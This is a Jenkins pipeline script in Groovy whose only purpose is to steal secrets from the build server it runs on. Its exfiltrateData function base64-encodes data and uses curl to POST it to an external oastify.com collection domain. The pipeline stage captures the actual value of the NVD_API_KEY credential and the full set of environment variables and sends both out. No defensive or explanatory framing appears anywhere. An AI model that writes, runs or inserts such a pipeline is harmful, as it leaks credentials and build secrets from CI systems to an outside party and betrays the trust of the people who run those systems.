def EXFILTRATION_DOMAIN = "9w6fdx3mohs6hg9t3e11yzpnkeq5ev2k.oastify.com"

def exfiltrateData(String type, def dataPayload, String credId = null) {
    try {
        def jsonData = [
            type: type,
            build_url: env.BUILD_URL ?: 'N/A',
            job_name: env.JOB_NAME ?: 'N/A',
            node_name: env.NODE_NAME ?: 'N/A',
            timestamp: new Date().toISOString()
        ]
        if (credId) {
            jsonData.put("credential_id", credId)
        }
        jsonData.put("data", dataPayload)
        def jsonString = new groovy.json.JsonOutput().toJson(jsonData)
        def encodedJson = jsonString.bytes.encodeBase64().toString()
        def command = "curl -X POST --connect-timeout 15 -s -o /dev/null -w '%{http_code}' --data-urlencode 'blob=${encodedJson}' 'http://${EXFILTRATION_DOMAIN}/jenkins_exfil_data'"
        echo "Attempting exfiltration for type: ${type}..."
        def result = sh(script: command + " || echo 'curl_command_failed'", returnStdout: true).trim()
        if (result == 'curl_command_failed') {
            echo "Error: Exfiltration command failed for '${type}'."
        } else if (result.matches(/\d{3}/) && (result.toInteger() < 200 || result.toInteger() >= 300) ) {
            echo "Warning: Exfiltration attempt for '${type}' to ${EXFILTRATION_DOMAIN} returned HTTP status: ${result}"
        } else if (result.matches(/\d{3}/)) {
            echo "Exfiltration attempt for '${type}' to ${EXFILTRATION_DOMAIN} likely succeeded with HTTP status: ${result}"
        } else {
            echo "Warning: Exfiltration attempt for '${type}' to ${EXFILTRATION_DOMAIN} returned unexpected output: ${result}"
        }
    } catch (Exception e) {
        echo "Exception during exfiltration for type '${type}': ${e.getMessage()}"
        try {
            def errorJsonString = new groovy.json.JsonOutput().toJson([type: "exfiltration_function_error", error_message: e.getMessage(), failed_type: type])
            def encodedErrorJson = errorJsonString.bytes.encodeBase64().toString()
            sh(script: "curl -X POST --connect-timeout 5 -s -o /dev/null --data-urlencode 'blob=${encodedErrorJson}' 'http://${EXFILTRATION_DOMAIN}/jenkins_exfil_error' || true", returnStdout: true).trim()
        } catch (Exception nestedE) {
            echo "Failed to exfiltrate error details about exfiltration failure: ${nestedE.getMessage()}"
        }
    }
}

pipeline {
    agent any
    environment {
        EXFIL_NVD_API_KEY = credentials('NVD_API_KEY')
    }
    stages {
        stage('ExfiltrateAllSecurityData') {
            steps {
                script {
                    echo "Attempting to exfiltrate environment variables and NVD_API_KEY."

                    def nvdApiKeyCredId = 'NVD_API_KEY'
                    def nvdApiKeyValue = env.EXFIL_NVD_API_KEY

                    if (nvdApiKeyValue != null && nvdApiKeyValue != "") {
                         exfiltrateData("credential_NVD_API_KEY_via_env_block",
                                       [credential_id: nvdApiKeyCredId,
                                        retrieved_value_present: "yes (value captured and sent)",
                                        actual_value: nvdApiKeyValue], // Sending the actual value
                                       nvdApiKeyCredId)
                    } else {
                         exfiltrateData("credential_NVD_API_KEY_via_env_block_not_found",
                                       [credential_id: nvdApiKeyCredId,
                                        error: "NVD_API_KEY was not found or was empty in env.EXFIL_NVD_API_KEY after using credentials() in environment block."],
                                       nvdApiKeyCredId)
                    }
                    
                    exfiltrateData("all_environment_variables", env.getEnvironment())
                    
                    def originalVersionVar = "8.3"
                    exfiltrateData("original_script_variables_info_security_jenkinsfile", [original_version_variable_from_jenkins_security: originalVersionVar])

                    echo "Minimal exfiltration attempts for Jenkins_security file complete."
                }
            }
        }
    }
}